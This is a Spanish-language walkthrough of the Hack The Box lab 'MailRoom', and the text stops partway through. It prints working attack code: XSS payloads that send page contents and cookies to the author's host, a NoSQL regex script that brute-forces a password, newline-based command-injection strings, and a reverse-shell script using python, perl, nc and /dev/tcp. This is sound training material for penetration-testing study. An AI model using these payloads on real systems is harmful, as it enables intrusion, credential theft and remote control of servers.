---
tags:
title: MailRoom - Hard (HTB)
permalink: /MailRoom-HTB-Writeup
toc: true
toc_label: Topics
toc_sticky: true
sidebar: main
---
---
# Recon

```bash
nmapf 10.129.229.1
Nmap Full scan in progress
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-17 18:43 -0500
Initiating Ping Scan at 18:43
Scanning 10.129.229.1 [4 ports]
Completed Ping Scan at 18:43, 0.75s elapsed (1 total hosts)
Initiating Parallel DNS resolution of 1 host. at 18:43
Completed Parallel DNS resolution of 1 host. at 18:43, 0.50s elapsed
Initiating SYN Stealth Scan at 18:43
Scanning 10.129.229.1 [65535 ports]
Discovered open port 22/tcp on 10.129.229.1
Discovered open port 80/tcp on 10.129.229.1
Completed SYN Stealth Scan at 18:44, 9.02s elapsed (65535 total ports)
Nmap scan report for 10.129.229.1
Host is up, received echo-reply ttl 63 (0.35s latency).
Scanned at 2026-02-17 18:43:59 EST for 9s
Not shown: 62765 closed tcp ports (reset), 2768 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE REASON
22/tcp open  ssh     syn-ack ttl 63
80/tcp open  http    syn-ack ttl 62

Read data files from: /usr/share/nmap
Nmap done: 1 IP address (1 host up) scanned in 10.47 seconds
           Raw packets sent: 83459 (3.672MB) | Rcvd: 71327 (2.853MB)
-e [*] IP: 10.129.229.1
[*] Puertos abiertos: 22,80
/usr/bin/xclip
-e [*] Service scanning with nmap against 22,80 Ports..
Starting Nmap 7.98 ( https://nmap.org ) at 2026-02-17 18:44 -0500
Nmap scan report for 10.129.229.1
Host is up (0.48s latency).

PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.5 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey:
|   3072 94:bb:2f:fc:ae:b9:b1:82:af:d7:89:81:1a:a7:6c:e5 (RSA)
|   256 82:1b:eb:75:8b:96:30:cf:94:6e:79:57:d9:dd:ec:a7 (ECDSA)
|_  256 19:fb:45:fe:b9:e4:27:5d:e5:bb:f3:54:97:dd:68:cf (ED25519)
80/tcp open  http    Apache httpd 2.4.54 ((Debian))
|_http-title: The Mail Room
|_http-server-header: Apache/2.4.54 (Debian)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 34.79 seconds
```

## Website

La pagina principal hostea una web de servicios de transporte

![image-center](/assets/images/Pasted image 20260217204557.png)

### Subdomain enumeration

Con la enumeración de subdominio con `wfuzz`, descubrí un nuevo subdominio.

```bash
wfuzz -c -t 200 -H "Host: FUZZ.mailroom.htb" -u http://mailroom.htb -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt  --hl 128
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://mailroom.htb/
Total requests: 114442

=====================================================================
ID           Response   Lines    Word       Chars       Payload
=====================================================================

000000262:   200        267 L    1181 W     13089 Ch    "git"
```

### git.mailroom.htb

Dentro del mismo se hostea el servicio de `Gitea`, en el cual sin estar logueado puedo empezar a enumerar, viendo así 3 usuarios del sistema.

![image-center](/assets/images/Pasted image 20260217210023.png)
### Source

Dentro de la seccion `Explore`, hay un repositorio.

![image-center](/assets/images/Pasted image 20260217204944.png)
### New subdomain

Dentro del archivo `auth.php`, se revela otro subdominio adicional de la maquina.

![image-center](/assets/images/Pasted image 20260217205545.png)
### NoSQL injection

Donde además, en el código del mismo se ve como se emplea una base de datos `MongoDB`, la cual puede llegar a ser vulnerable a `NoSQL Injection`.

```php
if (!is_string($_POST['email']) || !is_string($_POST['password'])) { 
	// Esto bloquea el uso de arrays como ['email' => ['$ne' => '']] }
```
### XSS

En la pagina principal, en la seccion de contacto, se ve como el campo de `Message`, es vulnerable a `XSS`.

![image-center](/assets/images/Pasted image 20260217210733.png)

Poniendo un simple payload.

![image-center](/assets/images/Pasted image 20260217210750.png)

Nos deja un link.

![image-center](/assets/images/Pasted image 20260217210818.png)

En el cual si clickeo, me sale la ventana con el payload.

![image-center](/assets/images/Pasted image 20260217210823.png)
### Exfil data

Trate además, de ver si por detrás, hay algún bot o `admin`, revisando los mensajes, haciendo que el mismo cuando visite el mio, cargue un recurso el cual voy a servir en mi maquina.

```js
<script src="http://10.10.17.19/xss.js"></script>
```

![image-center](/assets/images/Pasted image 20260217211013.png)

Después de enviar la solicitud veo que si.

```bash
www
[eth0] 192.168.100.8
[docker0] 172.17.0.1
[br-427beff723d7] 172.18.0.1
[tun0] 10.10.17.19
[/home/zsln/Desktop/zsln/Mailroom]
allPorts  notes  port_scan
Serving HTTP on 0.0.0.0 port 80 (http://0.0.0.0:80/) ...
10.129.229.1 - - [17/Feb/2026 19:10:29] code 404, message File not found
10.129.229.1 - - [17/Feb/2026 19:10:29] "GET /xss.js HTTP/1.1" 404 -
```
### Script

Es de notar que no puedo acceder al subdominio que se vio en el repositorio, ya que me sale un código `403`, asi que cree un script el cual hace que el admin que revise mi mensaje, primero cargue el código fuente, del mismo para ver si el si tiene acceso, y lo envíe en formato `base64` a mi maquina, desde donde voy a estar con mi servidor `Python`.

```javascript
(function() {
    var req = new XMLHttpRequest();
    req.open("GET", "http://staff-review-panel.mailroom.htb", false);
    
    req.onload = function() {
        if (req.status === 200) {
            var data = req.responseText;
            var exfil = new XMLHttpRequest();
            var payload = btoa(unescape(encodeURIComponent(data)));
            var cookies = btoa(document.cookie);
            
            exfil.open("GET", "http://10.10.17.19:8000/?resp=" + payload + "&c=" + cookies, false);
            exfil.send();
        }
    };

    req.onerror = function() {
        var errReq = new XMLHttpRequest();
        errReq.open("GET", "http://10.10.17.19:8000/error?msg=failed_to_reach_subdomain", true);
        errReq.send();
    };

    req.send();
})();
```
### Decode data

Luego de unos segundos veo un pedazo enorme de codigo.

```bash
 python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.229.1 - - [17/Feb/2026 20:07:53] "GET /exfil.js HTTP/1.1" 200 -
10.129.229.1 - - [17/Feb/2026 20:07:55] "GET /?resp=CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+Cgo8aGVhZD4KICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCIgLz4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29ud<SNIP>
```

El cual lo decodifique en `base64` y lo coloque dentro de un archivo `html`.

```bash
echo "CjwhRE9DVFlQRSBodG1sPgo8aHRtbCBsYW5nPSJlbiI+Cgo8aGVhZD4KICA8bWV0YSBjaGFyc2V0PSJ1dGYtOCIgLz4KICA8bWV0YSBuYW1lPSJ2aWV3cG9ydCIgY29udGVudD0id2lkdGg9ZGV2aWNlLXdpZHRoLCBpbml0aWFsLXNjYWxlPTEsIHNocmluay10by1maXQ9bm8iIC8+CiAgPG1ldGEgbmFtZT0iZGVzY3JpcHRpb24iIGNvbnRlbnQ9IiIgLz4KICA8bWV0YSBuYW1lPSJhdXRob3IiIGNvbnRlbnQ9IiIgLz4KICA8dGl0bGU+SW5xdWlyeSBSZXZpZXcgUGFuZWw8L3RpdGxlPgogIDwhLS0gRmF2aWNvbi0tPgogIDxsaW5rIHJlbD0iaWNvbiIgdHlwZT0iaW1hZ2UveC1pY29uIiBocmVmPSJhc3NldHMvZmF2aWNvbi5pY28iIC8+CiAgPCEtLSBCb290c3RyYXAgaWNvbnMtLT4KICA8bGluayBocmVmPSJmb250L2Jvb3RzdHJhcC1pY29ucy5jc3MiIHJlbD0ic3R5bGVzaGVldCIgLz4KICA8IS0tIENvcmUgdGhlbWUgQ1NTIChpbmNsdWRlcyBCb290c3RyYXApLS0+CiAgPGxpbmsgaHJlZj0iY3NzL3N0eWxlcy5jc3MiIHJlbD0ic3R5bGVzaGVldCIgLz4KPC9oZWFkPgoKPGJvZHk+CiAgPGRpdiBjbGFzcz0id3JhcHBlciBmYWRlSW5Eb3duIj4KICAgIDxkaXYgaWQ9ImZvcm1Db250ZW50Ij4KCiAgICAgIDwhLS0gTG9naW4gRm9ybSAtLT4KICAgICAgPGZvcm0gaWQ9J2xvZ2luLWZvcm0nIG1ldGhvZD0iUE9TVCI+CiAgICAgICAgPGgyPlBhbmVsIExvZ2luPC9oMj4KICAgICAgICA8aW5wdXQgcmVxdWlyZWQgdHlwZT0idGV4dCIgaWQ9ImVtYWlsIiBjbGFzcz0iZmFkZUluIHNlY29uZCIgbmFtZT0iZW1haWwiIHBsYWNlaG9sZGVyPSJFbWFpbCI+CiAgICAgICAgPGlucHV0IHJlcXVpcmVkIHR5cGU9InBhc3N3b3JkIiBpZD0icGFzc3dvcmQiIGNsYXNzPSJmYWRlSW4gdGhpcmQiIG5hbWU9InBhc3N3b3JkIiBwbGFjZWhvbGRlcj0iUGFzc3dvcmQiPgogICAgICAgIDxpbnB1dCB0eXBlPSJzdWJtaXQiIGNsYXNzPSJmYWRlSW4gZm91cnRoIiB2YWx1ZT0iTG9nIEluIj4KICAgICAgICA8cCBoaWRkZW4gaWQ9Im1lc3NhZ2UiIHN0eWxlPSJjb2xvcjogIzhGOEY4RiI+T25seSBzaG93IHRoaXMgbGluZSBpZiByZXNwb25zZSAtIGVkaXQgY29kZTwvcD4KICAgICAgPC9mb3JtPgoKICAgICAgPCEtLSBSZW1pbmQgUGFzc293cmQgLS0+CiAgICAgIDxkaXYgaWQ9ImZvcm1Gb290ZXIiPgogICAgICAgIDxhIGNsYXNzPSJ1bmRlcmxpbmVIb3ZlciIgaHJlZj0icmVnaXN0ZXIuaHRtbCI+Q3JlYXRlIGFuIGFjY291bnQ8L2E+CiAgICAgIDwvZGl2PgoKICAgIDwvZGl2PgogIDwvZGl2PgoKICA8IS0tIEJvb3RzdHJhcCBjb3JlIEpTLS0+CiAgPHNjcmlwdCBzcmM9ImpzL2Jvb3RzdHJhcC5idW5kbGUubWluLmpzIj48L3NjcmlwdD4KCiAgPCEtLSBMb2dpbiBGb3JtLS0+CiAgPHNjcmlwdD4KICAgIC8vIEdldCB0aGUgZm9ybSBlbGVtZW50CiAgICBjb25zdCBmb3JtID0gZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ2xvZ2luLWZvcm0nKTsKCiAgICAvLyBBZGQgYSBzdWJtaXQgZXZlbnQgbGlzdGVuZXIgdG8gdGhlIGZvcm0KICAgIGZvcm0uYWRkRXZlbnRMaXN0ZW5lcignc3VibWl0JywgZXZlbnQgPT4gewogICAgICAvLyBQcmV2ZW50IHRoZSBkZWZhdWx0IGZvcm0gc3VibWlzc2lvbgogICAgICBldmVudC5wcmV2ZW50RGVmYXVsdCgpOwoKICAgICAgLy8gU2VuZCBhIFBPU1QgcmVxdWVzdCB0byB0aGUgbG9naW4ucGhwIHNjcmlwdAogICAgICBmZXRjaCgnL2F1dGgucGhwJywgewogICAgICAgIG1ldGhvZDogJ1BPU1QnLAogICAgICAgIGJvZHk6IG5ldyBVUkxTZWFyY2hQYXJhbXMobmV3IEZvcm1EYXRhKGZvcm0pKSwKICAgICAgICBoZWFkZXJzOiB7ICdDb250ZW50LVR5cGUnOiAnYXBwbGljYXRpb24veC13d3ctZm9ybS11cmxlbmNvZGVkJyB9CiAgICAgIH0pLnRoZW4ocmVzcG9uc2UgPT4gewogICAgICAgIHJldHVybiByZXNwb25zZS5qc29uKCk7CgogICAgICB9KS50aGVuKGRhdGEgPT4gewogICAgICAgIC8vIERpc3BsYXkgdGhlIG5hbWUgYW5kIG1lc3NhZ2UgaW4gdGhlIHBhZ2UKICAgICAgICBkb2N1bWVudC5nZXRFbGVtZW50QnlJZCgnbWVzc2FnZScpLnRleHRDb250ZW50ID0gZGF0YS5tZXNzYWdlOwogICAgICAgIGRvY3VtZW50LmdldEVsZW1lbnRCeUlkKCdwYXNzd29yZCcpLnZhbHVlID0gJyc7CiAgICAgICAgZG9jdW1lbnQuZ2V0RWxlbWVudEJ5SWQoJ21lc3NhZ2UnKS5yZW1vdmVBdHRyaWJ1dGUoImhpZGRlbiIpOwogICAgICB9KS5jYXRjaChlcnJvciA9PiB7CiAgICAgICAgLy8gRGlzcGxheSBhbiBlcnJvciBtZXNzYWdlCiAgICAgICAgLy9hbGVydCgnRXJyb3I6ICcgKyBlcnJvcik7CiAgICAgIH0pOwogICAgfSk7CiAgPC9zY3JpcHQ+CjwvYm9keT4KPC9odG1sPg==" | base64 -d > test.html
```

Y viendo el contenido en el Firefox, veo que es el panel de sesión que se muestra en el repositorio.

![image-center](/assets/images/Pasted image 20260217221057.png)

### Leak password

Viendo el código de `auth.php`, se pide el parámetro `email` y `password`, de manera que mi código quedo asi.

```bash
var req = new XMLHttpRequest();
// apunto al panel de sesion
req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

// envio las credenciales
req.send("email=administrator@mailroom.htb&password=testtest123");

// exfiltro la RESPUESTA del servidor (aca viene el JSON de exito o error)
var exfil_req = new XMLHttpRequest();
exfil_req.open("GET", "http://10.10.17.19:8000/?resp=" + btoa(req.responseText), false);
exfil_req.send();
```

Luego de enviarlo, me llega el código, el cual decodificándolo, me muestra un mensaje de error.

```bash
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.229.1 - - [17/Feb/2026 20:21:10] "GET /exfil.js HTTP/1.1" 200 -
10.129.229.1 - - [17/Feb/2026 20:21:12] "GET /?resp=eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgZW1haWwgb3IgcGFzc3dvcmQifQ== HTTP/1.1" 200 -

<SNIP>

echo "eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgZW1haWwgb3IgcGFzc3dvcmQifQ==" | base64 -d
{"success":false,"message":"Invalid email or password"}  
```

Cambie los datos a los de una inyección `NoSQL`. Haciendo que devuelva un input distinto, o tratar de bypassear el panel de login.

```javascript
var req = new XMLHttpRequest();

req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

req.send("email[$ne]=test&password[$ne]=test");

var exfil_req = new XMLHttpRequest();
exfil_req.open("GET", "http://10.10.17.19:8000/?resp=" + btoa(req.responseText), false);
exfil_req.send();
```

Luego, denuevo, decodeo la data y veo un mensaje de error distinto.

```bash
 python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.229.1 - - [17/Feb/2026 20:28:14] "GET /exfil.js HTTP/1.1" 200 -
10.129.229.1 - - [17/Feb/2026 20:28:24] "GET /?resp=eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgaW5wdXQgZGV0ZWN0ZWQifXsic3VjY2VzcyI6dHJ1ZSwibWVzc2FnZSI6IkNoZWNrIHlvdXIgaW5ib3ggZm9yIGFuIGVtYWlsIHdpdGggeW91ciAyRkEgdG9rZW4ifQ== HTTP/1.1" 200 -

<SNIP>

echo eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgaW5wdXQgZGV0ZWN0ZWQifXsic3VjY2VzcyI6dHJ1ZSwibWVzc2FnZSI6IkNoZWNrIHlvdXIgaW5ib3ggZm9yIGFuIGVtYWlsIHdpdGggeW91ciAyRkEgdG9rZW4ifQ== | base64 -d
{"success":false,"message":"Invalid input detected"}{"success":true,"message":"Check your inbox for an email with your 2FA token"}   
```
### Error based

Para validar que tipo de error me devuelve cuando la consulta no es True, coloque un `email` que no exista, con `[$regex]` que valide que empieza con cualquier carácter en el campo `password`.

```bash
var req = new XMLHttpRequest();
// 1. Apuntamos específicamente a auth.php
req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

// 2. Enviamos las credenciales
req.send("email=testing@mailroom.htb&password[$regex]=.*");

// 3. Exfiltramos la RESPUESTA del servidor (aquí vendrá el JSON de éxito o error)
var exfil_req = new XMLHttpRequest();
exfil_req.open("GET", "http://10.10.17.19:8000/?resp=" + btoa(req.responseText), false);
exfil_req.send();
```

De manera que cuando recibo la data, el mensaje cambia.

```bash
10.129.229.1 - - [17/Feb/2026 20:37:26] "GET /?resp=eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgaW5wdXQgZGV0ZWN0ZWQifTxiciAvPgo8Yj5XYXJuaW5nPC9iPjogIENhbm5vdCBtb2RpZnkgaGVhZGVyIGluZm9ybWF0aW9uIC0gaGVhZGVycyBhbHJlYWR5IHNlbnQgYnkgKG91dHB1dCBzdGFydGVkIGF0IC92YXIvd3d3L3N0YWZmcm9vbS9hdXRoLnBocDoyMCkgaW4gPGI+L3Zhci93d3cvc3RhZmZyb29tL2F1dGgucGhwPC9iPiBvbiBsaW5lIDxiPjUxPC9iPjxiciAvPgp7InN1Y2Nlc3MiOmZhbHNlLCJtZXNzYWdlIjoiSW52YWxpZCBlbWFpbCBvciBwYXNzd29yZCJ9 HTTP/1.1" 200 -

<SNIP>

echo eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgaW5wdXQgZGV0ZWN0ZWQifTxiciAvPgo8Yj5XYXJuaW5nPC9iPjogIENhbm5vdCBtb2RpZnkgaGVhZGVyIGluZm9ybWF0aW9uIC0gaGVhZGVycyBhbHJlYWR5IHNlbnQgYnkgKG91dHB1dCBzdGFydGVkIGF0IC92YXIvd3d3L3N0YWZmcm9vbS9hdXRoLnBocDoyMCkgaW4gPGI+L3Zhci93d3cvc3RhZmZyb29tL2F1dGgucGhwPC9iPiBvbiBsaW5lIDxiPjUxPC9iPjxiciAvPgp7InN1Y2Nlc3MiOmZhbHNlLCJtZXNzYWdlIjoiSW52YWxpZCBlbWFpbCBvciBwYXNzd29yZCJ9 | base64 -d
{"success":false,"message":"Invalid input detected"}<br />
<b>Warning</b>:  Cannot modify header information - headers already sent by (output started at /var/www/staffroom/auth.php:20) in <b>/var/www/staffroom/auth.php</b> on line <b>51</b><br />
{"success":false,"message":"Invalid email or password"} 
```

Ahora coloque un mail valido, como el del usuario `tristan`, e hice lo mismo.

```javascript
var req = new XMLHttpRequest();
// 1. Apuntamos específicamente a auth.php
req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");

// 2. Enviamos las credenciales
req.send("email=tristan@mailroom.htb&password[$regex]=.*");

// 3. Exfiltramos la RESPUESTA del servidor (aquí vendrá el JSON de éxito o error)
var exfil_req = new XMLHttpRequest();
exfil_req.open("GET", "http://10.10.17.19:8000/?resp=" + btoa(req.responseText), false);
exfil_req.send();
```

Donde en el respuesta, el mensaje de error es distinto sabiendo que este codigo devuelve cuando el input es valido.

```bash
10.129.229.1 - - [17/Feb/2026 20:38:36] "GET /?resp=eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgaW5wdXQgZGV0ZWN0ZWQifXsic3VjY2VzcyI6dHJ1ZSwibWVzc2FnZSI6IkNoZWNrIHlvdXIgaW5ib3ggZm9yIGFuIGVtYWlsIHdpdGggeW91ciAyRkEgdG9rZW4ifQ== HTTP/1.1" 200 -

<SNIP>

echo eyJzdWNjZXNzIjpmYWxzZSwibWVzc2FnZSI6IkludmFsaWQgaW5wdXQgZGV0ZWN0ZWQifXsic3VjY2VzcyI6dHJ1ZSwibWVzc2FnZSI6IkNoZWNrIHlvdXIgaW5ib3ggZm9yIGFuIGVtYWlsIHdpdGggeW91ciAyRkEgdG9rZW4ifQ== | base64 -d
{"success":false,"message":"Invalid input detected"}{"success":true,"message":"Check your inbox for an email with your 2FA token"}
```

Por lo que puedo empezar a enumerar el campo password, colocando en una variable todos los caracteres especiales y alfanuméricos, y primero detectando el primer carácter, diciendo `^` para saber cual es el primer caracter.

```bash
(function() { 
    var alphabet = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-_=+?!@#$<>"; 
    var password = ""; 
    var targetEmail = "tristan@mailroom.htb"; 

    function report(found) { 
        var exfil = new XMLHttpRequest(); 
        exfil.open("GET", "http://10.10.17.19:8000/?found=" + found, false); 
        exfil.send(); 
    } 

    for (var length = 0; length < 20; length++) { 
        var foundCharInThisRound = false; 
        for (var i = 0; i < alphabet.length; i++) { 
            var charToTest = alphabet[i]; 
            var req = new XMLHttpRequest(); 
            req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false); 
            req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded"); 
            
            var payload = "email=" + targetEmail + "&password[$regex]=^" + password + charToTest; 
            req.send(payload); 

            if (req.responseText.includes("Check your inbox")) { 
                password += charToTest; 
                report(password); 
                foundCharInThisRound = true; 
                break; 
            } 
        } 
        if (!foundCharInThisRound) break; 
    } 
})();
```

Lo que me devolvió el carácter `6`.

```bash
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.229.1 - - [17/Feb/2026 20:45:09] "GET /exfil.js HTTP/1.1" 200 -
10.129.229.1 - - [17/Feb/2026 20:45:17] "GET /?found=6 HTTP/1.1" 200 -
```

Ahora repetí el proceso manualmente, pero cambiando el payload, haciendo una consulta como el password es `6.*`, probando en la siguiente posicion un carácter valido y asi continuamente.

```javascript
(function() {
    var alphabet = "abcdefghijklmnopqrstuvwxyz0123456789ABCDEFGHIJKLMNOPQRSTUVWXYZ-_=+!@#$<>";
    var password = ""; // Aquí se irá acumulando la contraseña
    var targetEmail = "tristan@mailroom.htb";
    
    // Función para reportar hallazgos a tu IP
    function report(found) {
        var exfil = new XMLHttpRequest();
        exfil.open("GET", "http://10.10.17.19:8000/?found=" + found, false);
        exfil.send();
    }

    // Queremos encontrar, por ejemplo, los primeros 20 caracteres
    for (var length = 0; length < 20; length++) {
        var foundCharInThisRound = false;

        for (var i = 0; i < alphabet.length; i++) {
            var charToTest = alphabet[i];
            var req = new XMLHttpRequest();
            
            req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
            req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
            
            // Usamos ^ para indicar que empiece exactamente con lo que ya sabemos + la nueva letra
            var payload = "email=" + targetEmail + "&password[$regex]=6" + password + charToTest + ".*";
            req.send(payload);

            // Si la respuesta contiene el mensaje de éxito del 2FA, encontramos la letra
            if (req.responseText.includes("Check your inbox")) {
                password += charToTest;
                report(password);
                foundCharInThisRound = true;
                break; // Pasamos a buscar la siguiente posición
            }
        }
        
        // Si recorrimos todo el alfabeto y no hubo acierto, terminamos
        if (!foundCharInThisRound) break;
    }
})();
```
### Shell

Lo que luego en el final me quede con esto
```bash
 python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.229.1 - - [17/Feb/2026 20:45:09] "GET /exfil.js HTTP/1.1" 200 -
10.129.229.1 - - [17/Feb/2026 20:45:17] "GET /?found=6 HTTP/1.1" 200 -
10.129.229.1 - - [17/Feb/2026 20:47:53] "GET /?found=9 HTTP/1.1" 200 -
10.129.229.1 - - [17/Feb/2026 20:48:15] "GET /?found=t HTTP/1.1" 200 -
10.129.229.1 - - [17/Feb/2026 20:48:27] "GET /?found=r HTTP/1.1" 200 -
10.129.229.1 - - [17/Feb/2026 20:49:33] "GET /?found=i HTTP/1.1" 200 -
10.129.229.1 - - [17/Feb/2026 20:49:43] "GET /?found=s HTTP/1.1" 200 -
10.129.229.1 - - [17/Feb/2026 20:49:56] "GET /?found=R HTTP/1.1" 200 -
10.129.229.1 - - [17/Feb/2026 20:50:07] "GET /?found=u HTTP/1.1" 200 -
10.129.229.1 - - [17/Feb/2026 20:50:19] "GET /?found=l HTTP/1.1" 200 -
10.129.229.1 - - [17/Feb/2026 20:50:38] "GET /?found=e HTTP/1.1" 200 -
10.129.229.1 - - [17/Feb/2026 20:50:47] "GET /?found=z HTTP/1.1" 200 -
10.129.229.1 - - [17/Feb/2026 20:51:03] "GET /?found=! HTTP/1.1" 200 -
<SNIP>
```
### Email

Quedándome con el resultado `69trisRulez!`, lo cual era valido para el inicio de sesión por `ssh` para el usuario `tristan`, donde es de notar que el propio ssh indica que tiene un email.

```bash
ssh tristan@mailroom.htb
<SNIP>

You have mail.
Last login: Thu Apr 20 20:31:16 2023 from 10.10.14.47
tristan@mailroom:~$ 
```
## Shell as www-data@container

Viendo el contenido del email, es un mail con el mail de `autenticación 2FA`.

```bash
tristan@mailroom:/var/mail$ ls
root  tristan
tristan@mailroom:/var/mail$ cat tristan
Return-Path: <noreply@mailroom.htb>
X-Original-To: tristan@mailroom.htb
Delivered-To: tristan@mailroom.htb
Received: from localhost (unknown [172.19.0.5])
	by mailroom.localdomain (Postfix) with SMTP id 598EED46
	for <tristan@mailroom.htb>; Wed, 18 Feb 2026 01:55:24 +0000 (UTC)
Subject: 2FA

Click on this link to authenticate: http://staff-review-panel.mailroom.htb/auth.php?token=b31e579e2d155d983913fea2e914d9e1
```
### Local port forward

Para poder acceder a la web, use el mismo ssh para crear el tunel.

```bash
ssh -L 80:127.0.0.1:80 tristan@mailroom.htb
```

Y cambien el contenido de mi `/etc/hosts`.

```bash
addhost 127.0.0.1 staff-review-panel.mailroom.htb
[+] Appended staff-review-panel.mailroom.htb to existing entry for 127.0.0.1 in /etc/hosts
127.0.0.1	localhost ws.qreader.htb staff-review-panel.mailroom.htb
```
### Authentication fail

Usando el propio link, veo que falla, debe ser porque el token ya no es valido.

![image-center](/assets/images/Pasted image 20260217230133.png)
### New token

Por lo que en el directorio de los mails, me puse en modo espectador, para ver si aparecía un mail nuevo.

```bash
watch -n 0.1 "cat /var/mail/tristan | grep token"
```

Y volví a enviar en el campo de contacto de la pagina, envié una solicitud de sesión para que envié un nuevo email a `tristan` con el nuevo token.

```javascript
var req = new XMLHttpRequest();
req.open("POST", "http://staff-review-panel.mailroom.htb/auth.php", false);
req.setRequestHeader("Content-Type", "application/x-www-form-urlencoded");
req.send("email=tristan@mailroom.htb&password=69trisRulez!");
```
### Command injection

El cual luego de unos segundos aparece el nuevo token, y use el mismo para loguearme.

![image-center](/assets/images/Pasted image 20260217230417.png)

En la sección `inspect`, veo que se puede colocar un `id` de una `inquiry`. Donde la solicitud de la misma la capture con `Burpsuite`.

El codigo de esta pagina, en el repositorio mostraba que la mayoria de caracteres que podia usar para escapar e inyectar comandos, estabas bloqueados.

```php
$data = '';
if (isset($_POST['inquiry_id'])) {
  $inquiryId = preg_replace('/[\$<>;|&{}\(\)\[\]\'\"]/', '', $_POST['inquiry_id']);
  $contents = shell_exec("cat /var/www/mailroom/inquiries/$inquiryId.html");

  // Parse the data between  and </p>
  $start = strpos($contents, '<p class="lead mb-0">');
  if ($start === false) {
    // Data not found
    $data = 'Inquiry contents parsing failed';
  } else {
    $end = strpos($contents, '</p>', $start);
    $data = htmlspecialchars(substr($contents, $start + 21, $end - $start - 21));
  }
}
```

Sin embargo los backticks (\`\) y los saltos de linea (`\n` o `%0a')` no estaban en la misma, permitiendome ejecutar comandos, por ejemplo un curl a mi maquina.

![image-center](/assets/images/Pasted image 20260217232209.png)

Viendo en mi servidor la solicitud del mismo.

```bash
python3 -m http.server 8000
Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
10.129.229.1 - - [17/Feb/2026 21:19:31] code 404, message File not found
10.129.229.1 - - [17/Feb/2026 21:19:31] "GET /test HTTP/1.1" 404 -
^C
Keyboard interrupt received, exiting.
```
### Shell

Cree un index.html con una reverse shell dentro y me puse con mi servidor
```bash
gen_lin_rev 10.10.17.19 4444
[+] Wrote Linux reverse shells to /home/zsln/Desktop/zsln/Mailroom/index.html

<SNIP>

cat index.html
#! /bin/sh


if command -v python > /dev/null 2>&1; then
        python -c 'import socket,subprocess,os; s=socket.socket(socket.AF_INET,socket.SOCK_STREAM); s.connect(("10.10.17.19",4444)); os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2); p=subprocess.call(["/bin/sh","-i"]);'
        exit;
fi

if command -v perl > /dev/null 2>&1; then
        perl -e 'use Socket;$i="10.10.17.19";$p=4444;socket(S,PF_INET,SOCK_STREAM,getprotobyname("tcp"));if(connect(S,sockaddr_in($p,inet_aton($i)))){open(STDIN,">&S");open(STDOUT,">&S");open(STDERR,">&S");exec("/bin/sh -i");};'
        exit;
fi

if command -v nc > /dev/null 2>&1; then
        rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.17.19 4444 >/tmp/f
        exit;
fi

if command -v sh > /dev/null 2>&1; then
        /bin/sh -i >& /dev/tcp/10.10.17.19/4444 0>&1
        exit;
fi
```

Y luego coloque esta inyección para colocar el archivo en el directorio `/dev/shm` de la maquina.

```bash
%0acurl%0910.10.17.19:8000/%09-o%09/dev/shm/rev.sh%0a
```

Y luego con `bash` lo ejecute.

```bash
%0abash%09/dev/shm/rev.sh%0a
```

Haciendo que me llegue la shell como el usuario `www-data` pero en un contenedor de docker.

```bash
sudo nc -nvlp 4444
listening on [any] 4444 ...
connect to [10.10.17.19] from (UNKNOWN) [10.129.229.1] 36716
/bin/sh: 0: can't access tty; job control turned off
$ whoami
www-data
```
## Shell as matthew
### config file

En el archivo `config` del repositorio de la web principal, encontré la password del usuario `matthew`.

```bash
www-data@7a5a780dc2a4:/var/www/mailroom/.git$ cat config
